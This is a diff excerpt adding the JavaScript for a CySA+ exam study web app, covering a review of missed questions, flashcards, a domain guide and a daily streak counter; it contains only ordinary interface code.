+        "<div style='font-size:13px;font-weight:600;color:var(--tx);margin-bottom:8px'><span style='background:var(--rd0);color:var(--rd);padding:2px 6px;border-radius:4px;font-size:10px;font-weight:700;margin-right:6px'>Q"+(i+1)+" D"+q.d+"</span>"+q.q+"</div>" +
+        opts2+"<div style='margin-top:6px;padding:8px;background:var(--bg3);border-radius:8px;font-size:12px;color:var(--tx3)'>💡 "+q.e+"</div></div>";
+    }
+    if(count===0)items+="<p style='color:var(--gn);text-align:center;padding:20px'>🎉 No missed questions!</p>";
+    items+="</div>";
+    el.innerHTML=items;el.style.display="block";
+    if(btn)btn.textContent="Hide Review";el.scrollIntoView({behavior:"smooth"});
+  } else {el.style.display="none";if(btn)btn.textContent="📖 Review Missed";}
+}
+window.toggleMissedReview=toggleMissedReview;
+
+// ── FLASHCARDS ────────────────────────────────────────────────────────────────
+function renderCardsHome(){
+  render("<div class='pg'><h2 class='stitle'>Flashcards</h2>" +
+    "<div class='card'>" +
+      "<div style='font-weight:700;margin-bottom:12px'>"+FLASH_CARDS.length+" CySA+ key terms and concepts</div>" +
+      "<button class='btn btn-p btn-full' style='margin-bottom:10px' onclick='renderCards()'>Start All Flashcards</button>" +
+      "<button class='btn btn-s btn-full' onclick='renderCards(true)'>Shuffle Mode</button>" +
+    "</div></div>");
+}
+window.renderCardsHome=renderCardsHome;
+
+var _fcIdx=0,_fcCards=[];
+function renderCards(shuf){_fcCards=shuf?shuffle([].concat(FLASH_CARDS)):[].concat(FLASH_CARDS);_fcIdx=0;showCard();}
+window.renderCards=renderCards;
+function showCard(){
+  if(_fcIdx>=_fcCards.length){
+    render("<div class='pg' style='text-align:center'><div class='card2' style='padding:40px;margin-bottom:20px'><div style='font-size:48px;margin-bottom:12px'>🎉</div><div style='font-family:Syne,sans-serif;font-size:28px;font-weight:800'>All Done!</div><div style='color:var(--tx3);margin-top:8px'>"+FLASH_CARDS.length+" cards reviewed</div></div>" +
+      "<div style='display:flex;gap:10px;justify-content:center'><button class='btn btn-p' onclick='renderCards()'>Again</button><button class='btn btn-s' onclick='renderCards(true)'>Shuffle</button><button class='btn btn-s' onclick='renderCardsHome()'>Back</button></div></div>");
+    return;
+  }
+  var c=_fcCards[_fcIdx],pct=Math.round(_fcIdx/FLASH_CARDS.length*100);
+  render("<div class='pg'>" +
+    "<div class='row' style='margin-bottom:14px'><button class='btn btn-s' onclick='renderCardsHome()'>← Back</button><div style='flex:1'><div class='prog-bar'><div class='prog-fill' style='width:"+pct+"%'></div></div></div><span style='font-size:12px;color:var(--tx3)'>"+(_fcIdx+1)+"/"+FLASH_CARDS.length+"</span></div>" +
+    "<div class='fc' id='fc' onclick='flipCard()'><div class='fc-inner'>" +
+      "<div class='fc-front'><div style='text-align:center'><div style='font-size:11px;color:var(--tx3);margin-bottom:12px;text-transform:uppercase;letter-spacing:1px'>Tap to reveal</div><div style='font-family:Syne,sans-serif;font-size:24px;font-weight:800'>"+c.front+"</div></div></div>" +
+      "<div class='fc-back'><div style='text-align:center;font-size:15px;line-height:1.7;color:var(--tx)'>"+c.back+"</div></div>" +
+    "</div></div>" +
+    "<div style='display:flex;gap:10px;margin-top:14px'><button class='btn btn-s' style='flex:1' onclick='prevCard()'>← Prev</button><button class='btn btn-p' style='flex:2' onclick='nextCard()'>Next →</button></div>" +
+  "</div>");
+}
+window.flipCard=function(){var el=document.getElementById("fc");if(el)el.classList.toggle("flipped");};
+window.nextCard=function(){_fcIdx++;showCard();};
+window.prevCard=function(){if(_fcIdx>0){_fcIdx--;showCard();}};
+
+// ── LEARN ─────────────────────────────────────────────────────────────────────
+function renderLearn(){
+  var items="";
+  for(var d=1;d<=4;d++){
+    var qcnt=QZ.filter(function(q){return q.d==d;}).length;
+    items+="<div class='card' style='border-left:3px solid "+DOMAIN_COLORS[d]+";cursor:pointer;margin-bottom:10px' onclick='renderDomainGuide("+d+")'>" +
+      "<div style='display:flex;align-items:center;justify-content:space-between'>" +
+        "<div><div style='font-weight:700'>"+DOMAIN_NAMES[d]+"</div>" +
+          "<div style='font-size:12px;color:var(--tx3);margin-top:3px'>"+DOMAIN_WEIGHTS[d]+"% of exam · "+qcnt+" questions</div>" +
+        "</div><span style='color:var(--tx4);font-size:18px'>&#8594;</span>" +
+      "</div></div>";
+  }
+  render("<div class='pg'><h2 class='stitle'>Domain Guide</h2>"+items+"</div>");
+}
+window.renderLearn=renderLearn;
+
+function renderDomainGuide(d){
+  var prevBtn=d>1?"<button class='btn btn-s' onclick='renderDomainGuide("+(d-1)+")'>&#8592; D"+(d-1)+"</button>":"";
+  var nextBtn=d<4?"<button class='btn btn-s' onclick='renderDomainGuide("+(d+1)+")'>D"+(d+1)+" &#8594;</button>":"";
+  render("<div class='pg'>" +
+    "<button class='btn btn-s' onclick='renderLearn()' style='margin-bottom:16px'>&#8592; Back to Domains</button>" +
+    "<div class='card' style='border-left:3px solid "+DOMAIN_COLORS[d]+"'>" +
+      "<div style='background:"+DOMAIN_BG[d]+";border-radius:8px;padding:10px 14px;margin-bottom:16px;display:inline-block'>" +
+        "<span style='color:"+DOMAIN_COLORS[d]+";font-weight:700;font-size:13px'>Domain "+d+" · "+DOMAIN_WEIGHTS[d]+"% of exam</span>" +
+      "</div>" +
+      "<div style='font-size:14px;line-height:1.8;color:var(--tx2)'>"+DOMAIN_GUIDE[d]+"</div>" +
+    "</div>" +
+    "<div style='margin-top:16px;display:flex;gap:10px'>" +
+      "<button class='btn btn-p' onclick='startQuiz("+d+")'>Practice D"+d+" &#8594;</button>" +
+      prevBtn+nextBtn+
+    "</div></div>");
+}
+window.renderDomainGuide=renderDomainGuide;
+
+// ── INIT ──────────────────────────────────────────────────────────────────────
+function initApp(){
+  var today=new Date().toDateString();
+  if(S.stats.lastDate!==today){
+    var yesterday=new Date(Date.now()-86400000).toDateString();
+    if(S.stats.lastDate===yesterday)S.stats.streak++;else S.stats.streak=1;
+    S.stats.lastDate=today;try{save();}catch(e){}
+  }
+  renderHome();
+}
+initApp();
+
+</script>
+</body>
+</html>
